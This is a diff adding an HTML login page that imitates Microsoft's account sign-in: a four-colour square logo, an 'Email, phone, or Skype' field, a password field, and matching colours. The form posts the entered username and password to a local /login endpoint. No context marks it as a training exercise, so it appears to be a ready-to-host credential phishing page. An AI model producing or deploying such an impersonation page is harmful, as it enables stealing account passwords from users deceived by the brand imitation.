@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your account</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .login-card { background: #ffffff; padding: 44px; width: 100%; max-width: 440px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
+        .logo { width: 36px; height: 36px; display: grid; grid-template-columns: repeat(2, 1fr); gap: 2px; margin-bottom: 20px; }
+        .logo div { width: 17px; height: 17px; }
+        .logo .r1 { background-color: #f25022; }
+        .logo .r2 { background-color: #7fba00; }
+        .logo .r3 { background-color: #00a4ef; }
+        .logo .r4 { background-color: #ffb900; }
+        h1 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 20px; }
+        .input-group { position: relative; margin-bottom: 20px; }
+        input { width: 100%; padding: 6px 0; border: none; border-bottom: 1px solid #666; font-size: 16px; outline: none; }
+        input:focus { border-bottom: 2px solid #0067b8; }
+        .links { font-size: 13px; margin-bottom: 30px; }
+        .links a { color: #0067b8; text-decoration: none; display: inline-block; margin-top: 8px; }
+        .links a:hover { text-decoration: underline; }
+        .btn-container { display: flex; justify-content: flex-end; }
+        button { background-color: #0067b8; color: white; border: none; padding: 8px 32px; font-size: 15px; cursor: pointer; min-width: 108px; }
+        button:hover { background-color: #005da6; }
+    </style>
+</head>
+<body>
+    <div class="login-card">
+        <div class="logo">
+            <div class="r1"></div><div class="r2"></div>
+            <div class="r3"></div><div class="r4"></div>
+        </div>
+        <h1>Sign in</h1>
+        <form action="/login" method="POST">
+            <div class="input-group">
+                <input type="text" name="username" placeholder="Email, phone, or Skype" required>
+            </div>
+            <div class="input-group">
+                <input type="password" name="password" placeholder="Password" required>
+            </div>
+            <div class="links">
+                <div>No account? <a href="#">Create one!</a></div>
+                <div><a href="#">Can't access your account?</a></div>
+            </div>
+            <div class="btn-container">
+                <button type="submit">Sign in</button>
+            </div>
+        </form>
+    </div>
+</body>
+</html>
+
